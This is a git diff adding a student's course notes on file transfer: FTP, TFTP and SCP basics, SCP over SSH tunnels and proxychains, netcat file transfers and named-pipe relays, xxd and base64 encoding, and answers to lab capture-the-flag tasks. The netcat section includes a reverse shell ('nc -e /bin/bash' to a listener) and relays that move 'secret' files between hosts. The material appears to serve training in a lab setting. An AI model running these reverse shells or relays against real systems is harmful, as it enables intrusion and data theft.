@@ -1643,9 +1643,318 @@ https://net.cybbh.io/public/networking/latest/07_discovery/fg.html
      _hostname_
      permissions: sudo -l
      
+
+## File Transfer and redirection
+https://net.cybbh.io/public/networking/latest/09_file_transfer/fg.html
+
+    DESCRIBE COMMON METHODS FOR TRANSFERRING DATA
+    TFTP
+    FTP
+      Active
+      Passive
+    FTPS
+    SFTP
+    SCP
+
+    **TFTP**
+     Trivial File Transfer Protocol
+     RFC 1350 Rev2
+     UDP transport
+     Extremely small and very simple communication
+     No terminal communication
+     Insecure (no authentication or encryption)
+     No directory services
+     Used often for technologies such as BOOTP and PXE
     
+     FTP
+    **File Transfer Protocol**
+       RFC 959
+       Uses 2 separate TCP connections
+       Control Connection (21) / Data Connection (20*)
+       Authentication in clear-text
+       Insecure in default configuration
+       Has directory services
+       Anonymous login
+    **FTPS**
+     File Transfer Protocol Secure
+     TCP transport
+     Adds SSL/TLS encryption to FTP
+     Authentication with username/password or PKI
+     Interactive terminal access
+     SFTP
+      Secure File Transfer Protocol
+      TCP transport (port 22)
+      Uses symmetric and asymmetric encryption
+      Adds FTP like services to SSH
+      Authentication through sign in (username and password) or with SSH key
+      Interactive terminal access
+
+   ## SCP
+     Secure Copy Protocol
+     TCP Transport (port 22)
+     Uses symmetric and asymmetric encryption
+     Authentication through sign in (username and password) or with SSH key
+     Non-Interactive
+
+     **scp examples:**
+     Download a file from a remote directory to a local directory
+     scp student@172.16.82.106:secretstuff.txt /home/student
+
+     Upload a file to a remote directory from a local directory
+     scp secretstuff.txt student@172.16.82.106:/home/student
+
+     Copy a file from a remote host to a separate remote host
+     scp -3 student@172.16.82.106:/home/student/secretstuff.txt student@172.16.82.112:/home/student
+
+    **SCP SYNTAX W/ ALTERNATE SSHD**
+     Download a file from a remote directory to a local directory
+     scp -P 1111 student@172.16.82.106:secretstuff.txt .
+
+     Upload a file to a remote directory from a local directory
+     scp -P 1111 secretstuff.txt student@172.16.82.106:
+
+     **SCP SYNTAX THROUGH A TUNNEL**
+     Create a local port forward to target device
+     ssh student@172.16.82.106 -L 1111:localhost:22 -NT
+
+     Download a file from a remote directory to a local directory
+     scp -P 1111 student@localhost:secretstuff.txt /home/student
+
+     **Upload a file to a remote directory from a local directory**
+     scp -P 1111 secretstuff.txt student@localhost:/home/student
+
+     **SCP SYNTAX THROUGH A DYNAMIC PORT FORWARD**
+     Create a Dynamic Port Forward to target device
+     ssh student@172.16.82.106 -D 9050 -NT
+
+     Download a file from a remote directory to a local directory
+     proxychains scp student@localhost:secretstuff.txt .
+
+     Upload a file to a remote directory from a local directory
+     proxychains scp secretstuff.txt student@localhost:
+
+     
+  ## NETCAT
+      
+    NETCAT simply reads and writes data across network socket connections using the TCP/IP protocol.
+    Can be used for the following:
+        inbound and outbound connections, TCP/UDP, to or from any port
+        troubleshooting network connections
+        sending/receiving data (insecurely)
+        port scanning (similar to -sT in Nmap)
+        examples:
+        **CLIENT TO LISTENER FILE TRANSFER**
+        Listener (receive file):
+        nc -lvp 9001 > newfile.txt
+
+        Client (sends file):
+        nc 172.16.82.106 9001 < file.txt
+
+        **LISTENER TO CLIENT FILE TRANSFER**
+        Listener (sends file):
+        nc -lvp 9001 < file.txt
+
+        Client (receive file):
+        nc 172.16.82.106 9001 > newfile.txt
+
+        **NETCAT RELAY DEMOS**
+        Listener - Listener
+        On Blue_Host-1 Relay:
+        mknod mypipe p
+        nc -lvp 1111 < mypipe | nc -lvp 3333 > mypipe
+
+        On Internet_Host (send):
+        nc 172.16.82.106 1111 < secret.txt
+
+        On Blue_Priv_Host-1 (receive):
+        nc 192.168.1.1 3333 > newsecret.txt
+
+        **Client - Client**
+        On Internet_Host (send):
+        nc -lvp 1111 < secret.txt
+
+        On Blue_Priv_Host-1 (receive):
+        nc -lvp 3333 > newsecret.txt
+
+        On Blue_Host-1 Relay:
+        mknod mypipe p
+        nc 10.10.0.40 1111 < mypipe | nc 192.168.1.10 3333 > mypipe
+
+        "file" command to find file types.
+
+        **REVERSE SHELL USING NETCAT**
+        First listen for the shell on your device.
+        nc -lvp 9999
+
+        On Victim using -c :
+        nc -c /bin/bash 10.10.0.40 9999
+
+        On Victim using -e :
+        nc -e /bin/bash 10.10.0.40 9999
+
+  ## XXD EXAMPLE
+        echo a string of text and use xxd to convert it to a plain hex dump with the -p switch\
+        echo "Hex encoding test" | xxd -p
+        48657820656e636f64696e6720746573740a
+
+        echo hex string and use xxd to restore the data to its original format
+        echo "48657820656e636f64696e6720746573740a" | xxd -r -p
+        Hex encoding test
+
+        ![image](https://github.com/robertjenkins2828/Networking/assets/163066736/ffef630c-b2fd-4c84-a72f-b264a0c24d0c)
+        ![image](https://github.com/robertjenkins2828/Networking/assets/163066736/587c45aa-1fe2-4d81-a8ee-d4381c527bad)
+
+        **TRANSFER FILE WITH BASE64**
+        generate the base64 output of a file, with line wrapping removed
+        base64 -w0 logoCyber.png
+
+        TRANSFER FILE WITH BASE64
+
+        create a new file on your machine
+        nano b64image.png
+
+        decode from base64 with -d
+        base64 -d b64image.png > logoCyber.png
+
+        turn stuff into hex or base64
+        echo "answer" | md5sum
+        echo "answer" | base64
+        echo "answer" | xxd
+
+        CTFD's
+
+        Utilize the targets T2 and RELAY to develop the following netcat relays for use by Gorgan Cyber Forces. The use of names pipes should be utilized on RELAY:
+
+       Syntax for steghide tool:
+       steghide extract -sf [image name]
+       Passphrase: password
+       
+       The Donovian Insider provided a image called 1steg.jpg on T2 and is trying to connect to RELAY on TCP port 1234 to send the file. Establish a Netcat relay on RELAY to accept this connection and forward to T1. Once the images are downloaded you will use a command-line tool called steghide to extract the message. Perform an MD5SUM on this message to create flag1.
+       
+       File should be 89824 bytes in size.
+
+               on relay: 
+                nc -lvp 1234 < mypipe | nc 10.10.0.40 1111 > mypipe
+               on T1:
+                nc -lvp 1111 > test.txt
+
+
+
+     Utilize the targets T2 and RELAY to develop the following netcat relays for use by Gorgan Cyber Forces. The use of names pipes should be utilized on RELAY:
+
+     Syntax for steghide tool:
+     steghide extract -sf [image name]
+     Passphrase: password
+     
+     The Donovian Insider provided a image called 4steg.jpg on T2 listening for a connection from RELAY on TCP port 9876. Establish a Netcat relay on RELAY to make this connection and forward to T1. Once the images are downloaded you will use a command-line tool called steghide to extract the message. Perform an MD5SUM on this message to create flag4.
+     
+     File should be 204283 bytes in size.
+
+
+     on relay: 
+        nc 172.16.82.115 9876 < mypipe | nc 10.10.0.40 > mypipe 3333
+
+      on internet host:
+        nc -lvp 3333 > question4.txt
+        
+
+                
+               
+        
+        
+
+        
+        
+
+        
+        
+        
+
+        
+
+
+
+        
+        
+
+        
+        
+
+      
+
+        
+
+        
+        
+        
+        
+        
+        
+
+        
+
+        
+        
+        
+
+        
+        
+
+        
+        
+
+        
+        
+
+        
+        
+        
+        
+        
+        
+
+
+
+
+        
+
+        
+        
+        
+
+        
+        
+
     
-    
+
+
+
+     
+
+     
+     
+     
+     
+     
+
+     
+
+     
+     
+
+     
+     
+     
+
+     
+
+     
+     
+     
+     
+     
+     
+           
     
     
 
